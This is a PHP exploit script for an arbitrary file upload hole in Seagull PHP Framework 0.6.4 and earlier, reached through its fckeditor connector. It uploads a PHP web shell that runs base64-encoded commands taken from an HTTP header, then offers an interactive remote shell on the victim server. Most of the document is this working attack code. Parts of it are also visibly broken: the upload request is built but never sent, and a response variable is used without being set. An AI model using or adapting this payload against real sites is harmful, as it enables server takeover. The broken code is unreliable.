Seagull PHP Framework <= 0.6.4 (fckeditor) Arbitrary File Upload Exploit
========================================================================



<?php

/*
	------------------------------------------------------------------------
	Seagull PHP Framework <= 0.6.4 (fckeditor) Arbitrary File Upload Exploit
	------------------------------------------------------------------------
	
	author...: EgiX
	
	link.....: http://seagullproject.org/
	details..: works only with a specific server configuration (e.g. an Apache server with the mod_mime module installed)

	[-] vulnerable code in /www/tinyfck/filemanager/connectors/php/config.php
	
	33.	// SECURITY: You must explicitelly enable this "connector". (Set it to "true").
	34.	$Config[&#039;Enabled&#039;] = true ;
	35.	
	36.	// Path to user files relative to the document root.
	37.	$Config[&#039;UserFilesPath&#039;] = SGL_BASE_URL . &#039;/images/&#039; ;
	38.	
	40.	// user files directory. Usefull if you are using a virtual directory, symbolic
	41.	// link or alias. Examples: &#039;C:\\MySite\\UserFiles\\&#039; or &#039;/root/mysite/UserFiles/&#039;.
	42.	// Attention: The above &#039;UserFilesPath&#039; must point to the same directory.
	43.	$Config[&#039;UserFilesAbsolutePath&#039;] = SGL_WEB_ROOT.&#039;/images/&#039;;
	44.	
	45.	$Config[&#039;AllowedExtensions&#039;][&#039;File&#039;]    = array() ;
	46.	$Config[&#039;DeniedExtensions&#039;][&#039;File&#039;]     = array(&#039;php&#039;,&#039;php3&#039;,&#039;php5&#039;,&#039;phtml&#039;,&#039;asp&#039;,&#039;aspx&#039;,&#039;ascx&#039;,&#039;jsp&#039;,&#039;cfm&#039;, [...]
	47.	
	48.	$Config[&#039;AllowedExtensions&#039;][&#039;Image&#039;]   = array(&#039;jpg&#039;,&#039;gif&#039;,&#039;jpeg&#039;,&#039;png&#039;) ;
	49.	$Config[&#039;DeniedExtensions&#039;][&#039;Image&#039;]    = array() ;
	50.	
	51.	$Config[&#039;AllowedExtensions&#039;][&#039;Flash&#039;]   = array(&#039;swf&#039;,&#039;fla&#039;) ;
	52.	$Config[&#039;DeniedExtensions&#039;][&#039;Flash&#039;]    = array() ;
	53.	
	54.	$Config[&#039;AllowedExtensions&#039;][&#039;Media&#039;]   = array(&#039;swf&#039;,&#039;fla&#039;,&#039;jpg&#039;,&#039;gif&#039;,&#039;jpeg&#039;,&#039;png&#039;,&#039;avi&#039;,&#039;mpg&#039;,&#039;mpeg&#039;) ;
	55.	$Config[&#039;DeniedExtensions&#039;][&#039;Media&#039;]    = array() ;
	
	with a default configuration of this script, an attacker might be able to upload arbitrary
	files containing malicious PHP code due to multiple file extensions isn&#039;t properly checked
*/

error_reporting(0);
set_time_limit(0);
ini_set("default_socket_timeout", 5);

define(STDIN, fopen("php://stdin", "r"));

function http_send($host, $packet)
{
	$sock = fsockopen($host, 80);
	while (!$sock)
	{
		print "\n[-] No response from {$host}:80 Trying again...";
		$sock = fsockopen($host, 80);
	}
	fputs($sock, $packet);
	while (!feof($sock)) $resp .= fread($sock, 1024);
	fclose($sock);
	return $resp;
}

print "\n+--------------------------------------------------------------------+";
print "\n| Seagull <= 0.6.4 (fckeditor) Arbitrary File Upload Exploit by EgiX |";
print "\n+--------------------------------------------------------------------+\n";

if ($argc < 3)
{
	print "\nUsage......: php $argv[0] host path\n";
	print "\nExample....: php $argv[0] localhost /";
	print "\nExample....: php $argv[0] localhost /seagull/\n";
	die();
}

$host = $argv[1];
$path = $argv[2];

$filename  = md5(time()).".php.php4";
$connector = "tinyfck/filemanager/connectors/php/connector.php";

$payload  = "--o0oOo0o\r\n";
$payload .= "Content-Disposition: form-data; name=\"NewFile\"; filename=\"{$filename}\"\r\n\r\n";
$payload .= "<?php \${print(_code_)}.\${passthru(base64_decode(\$_SERVER[HTTP_CMD]))}.\${print(_code_)} ?>\r\n";
$payload .= "--o0oOo0o--\r\n";

$packet  = "POST {$path}{$connector}?Command=FileUpload&Type=File&CurrentFolder=%2f HTTP/1.0\r\n";
$packet .= "Host: {$host}\r\n";
$packet .= "Content-Length: ".strlen($payload)."\r\n";
$packet .= "Content-Type: multipart/form-data; boundary=o0oOo0o\r\n";
$packet .= "Connection: close\r\n\r\n";
$packet .= $payload;

if (!in_array(intval($html[1]), array(0, 201))) die("\n[-] Upload failed! (Error {$html[1]})\n");

while(1)
{
	print "\nseagull-shell# ";
	$cmd = trim(fgets(STDIN));
	if ($cmd != "exit")
	{
		$packet = "GET {$path}images/File/{$html[2]} HTTP/1.0\r\n";
		$packet.= "Host: {$host}\r\n";
		$packet.= "Cmd: ".base64_encode($cmd)."\r\n";
		$packet.= "Connection: close\r\n\r\n";
		$output = http_send($host, $packet);
		$shell  = explode("_code_", $output);
		print "\n{$shell[1]}";
	}
	else break;
}

?>



